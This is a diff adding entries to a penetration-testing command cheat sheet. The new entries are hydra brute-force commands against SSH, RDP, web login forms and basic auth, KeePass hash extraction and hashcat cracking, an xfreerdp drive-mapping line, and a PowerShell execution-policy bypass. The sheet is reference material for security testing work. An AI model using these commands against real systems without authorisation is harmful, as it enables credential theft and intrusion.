@@ -1643,6 +1643,7 @@ xfreerdp /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> /d:<DOMAIN> /cert-ignore
 xfreerdp /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> /dynamic-resolution +clipboard
 xfreerdp /v:<RHOST> /u:<USERNAME> /d:<DOMAIN> /pth:'<HASH>' /dynamic-resolution +clipboard
 xfreerdp /v:<RHOST> /dynamic-resolution +clipboard /tls-seclevel:0 -sec-nla
+xfreerdp /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> /d:<DOMAIN> /drive:share,/home/henrial  // join the share into the home of kali
 rdesktop <RHOST>
 ```
 
@@ -4899,6 +4900,8 @@ hashcat -m 3200 hash.txt -r /PATH/TO/FILE.rule
 hydra <RHOST> -l <USERNAME> -p <PASSWORD> <PROTOCOL>
 hydra <RHOST> -L /PATH/TO/WORDLIST/<FILE> -P /PATH/TO/WORDLIST/<FILE> <PROTOCOL>
 hydra <RHOST> -C /PATH/TO/WORDLIST/<FILE> ftp
+hydra -l USER -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://IP   //SSH Attack with user
+hydra -L /usr/share/wordlists/dirb/others/names.txt -p "PASSWORD" rdp://IP  //RDP Attack
 ```
 
 ```c
@@ -4912,6 +4915,8 @@ hydra <RHOST> -l <USERNAME> -P /PATH/TO/WORDLIST/<FILE> http-post-form "/index.p
 hydra <RHOST> -L /PATH/TO/WORDLIST/<FILE> -P /PATH/TO/WORDLIST/<FILE> http-post-form "/login:usernameField=^USER^&passwordField=^PASS^:unsuccessfulMessage" -s <RPORT>
 hydra <RHOST> -l root@localhost -P otrs-cewl.txt http-form-post "/otrs/index.pl:Action=Login&RequestedURL=Action=Admin&User=root@localhost&Password=^PASS^:Login failed" -vV -f
 hydra <RHOST> -l admin -P /PATH/TO/WORDLIST/<FILE> http-post-form "/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=COOKIE_1&__EVENTVALIDATION=COOKIE_2&UserName=^USER^&Password=^PASS^&LoginButton=Log+in:Login failed"
+hydra -l user -P /usr/share/wordlists/rockyou.txt IP http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
+hydra -I -V -P "$WORDLIST" -t 1 "http-get://IP:PORT/:A=BASIC:F=401" //Basic authentication with base64
 ```
 
 #### John
@@ -8667,6 +8672,8 @@ reg.exe save hklm\system c:\temp\system.save
 
 ```c
 Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+keepass2john Database.kdbx > keepass.hash
+hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
 ```
 
 ###### Internet Information Service (IIS)
@@ -9179,6 +9186,7 @@ type <FILE> | findstr /l <STRING>
 ```c
 Set-ExecutionPolicy remotesigned
 Set-ExecutionPolicy unrestricted
+Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
 ```
 
 ##### Script Execution Bypass
